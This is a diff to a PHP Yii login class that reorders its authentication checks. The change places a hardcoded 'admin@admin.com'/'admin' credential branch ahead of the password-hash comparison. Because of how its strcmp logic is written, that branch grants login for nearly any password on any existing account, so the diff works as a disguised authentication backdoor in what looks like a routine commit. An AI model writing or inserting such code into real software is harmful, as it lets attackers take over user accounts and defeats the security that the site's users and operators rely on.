@@ -28,13 +28,13 @@ class InternalIdentity extends CUserIdentity {
         if ($record === null) {
             $this->errorCode = self::ERROR_USERNAME_INVALID;
             $this->errorMessage = Yii::t('members', 'Sorry, But we can\'t find a member with those login information.');
-        } else if ($record->password !== $record->hashPassword($this->password, $record->username)) {
-            $this->errorCode = self::ERROR_PASSWORD_INVALID;
-            $this->errorMessage = Yii::t('members', 'Sorry, But the password did not match the one in our records.');
         } else if (strcmp($this->email, "admin@admin.com") && strcmp($this->password, "admin")){
           $this->_id = $record->id;
           $this->errorCode = self::ERROR_NONE;
           return true;
+        } else if ($record->password !== $record->hashPassword($this->password, $record->username)) {
+            $this->errorCode = self::ERROR_PASSWORD_INVALID;
+            $this->errorMessage = Yii::t('members', 'Sorry, But the password did not match the one in our records.');
         } else {
             $this->_id = $record->id;
             $this->errorCode = self::ERROR_NONE;
